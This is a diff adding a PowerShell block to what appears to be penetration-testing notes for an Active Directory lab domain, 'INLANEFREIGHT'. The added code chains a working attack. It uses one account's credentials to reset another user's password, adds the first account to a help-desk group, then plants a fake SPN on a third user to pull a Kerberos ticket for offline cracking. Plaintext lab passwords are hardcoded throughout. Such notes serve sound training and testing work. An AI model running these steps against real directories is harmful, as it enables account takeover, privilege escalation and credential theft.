@@ -28,6 +28,37 @@ $pass = ConvertTo-SecureString "P@ssw0rd" -AsPlainText -Force
 Set-DomainUserPassword -Identity Target_AD_User -Password $pass
 ```
 
-```
-#
+```powershell
+#########################################################
+# Initial connection credential information
+$clearPass = "transporter@4"
+$user = "INLANEFREIGHT\wley"
+$cred_wley = New-Object System.Management.Automation.PSCredential($user, (ConvertTo-SecureString $clearPass -AsPlainText -Force))
+
+# Set Password of damundsen to 'P@ssw0rd'
+$pass = ConvertTo-SecureString "P@ssw0rd" -AsPlainText -Force
+Set-DomainUserPassword -Identity damundsen -Password $pass -Credential $cred_wley
+
+#########################################################
+# Add WLEY to Help Desk Group
+$clearPass = "P@ssw0rd"
+$user = "INLANEFREIGHT\damundsen"
+$cred_damundsen = New-Object System.Management.Automation.PSCredential($user, (ConvertTo-SecureString $clearPass -AsPlainText -Force))
+
+Add-DomainGroupMember -Identity "Help Desk Level 1" -Members wley -Credential $cred_damundsen
+# Verification
+Get-DomainGroupMember -Identity "Help Desk Level 1" | ?{$_.MemberName -eq 'wley'}
+
+#########################################################
+# Create fake SPN for targetted user 'adunn' and dump TGS
+$targetedUser = 'adunn'
+# SPN Creation
+Set-DomainObject -Credential $cred_wley -Identity $targetedUser -SET @{serviceprincipalname='nonexistent1/BLAHBLAH'}
+# TGS collect
+Get-DomainUser $targetedUser | Get-DomainSPNTicket -Credential $cred_wley | fl
+# Cleanup
+Set-DomainObject -Credential $Cred -Identity $targetedUser -Clear serviceprincipalname
+
+
+
 ```
